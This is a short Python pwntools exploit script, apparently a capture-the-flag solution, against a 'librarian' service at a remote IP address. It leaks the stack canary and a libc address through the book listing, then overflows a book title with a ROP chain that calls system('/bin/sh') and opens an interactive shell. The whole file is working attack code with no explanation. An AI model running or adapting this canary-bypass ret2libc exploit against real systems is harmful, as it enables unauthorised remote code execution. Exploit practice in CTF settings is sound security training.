from pwn import *
#p = process('./librarian')
p = remote('43.201.16.196', 8888)

def add_book(val):
    p.sendlineafter(b'choice: ',b'2')
    p.sendlineafter(b'title: ',str(val).encode('utf-8'))


p.sendlineafter(b'choice: ',b'4')
for i in range(15):
        add_book(i)
p.sendlineafter(b'choice: ',b'1')
check = p.recvuntil(b'Exit\n')
cnry = u64(check[check.find(b'\x01')-7:check.find(b'\x01')].rjust(8,b'\x00'))
leak = u64(check[check.find(b'\x7f')-5:check.find(b'\x7f')+1].ljust(8,b'\x00'))
libc = leak - 0x23510
ogt_offset = [319952, 1073562, 1073570, 1073575]
ogt = libc + ogt_offset[3]

print(hex(cnry))
print(hex(leak))
print(hex(libc))
binsh = libc + 0x1b61b4
rdi = libc + 0x23b65
system = libc + 0x4e520
ret = rdi + 1

p.sendlineafter(b'choice: ',b'4')
for i in range(15):
    if i == 5:
        p.sendlineafter(b'choice: ',b'2')
        p.sendlineafter(b'title: ',b'5'+b'A'*7 + p64(cnry)*2 + p64(rdi) + p64(binsh) + p64(ret)+p64(system))
    else:
        add_book(i)

p.sendlineafter(b'choice: ',b'5')
p.interactive()


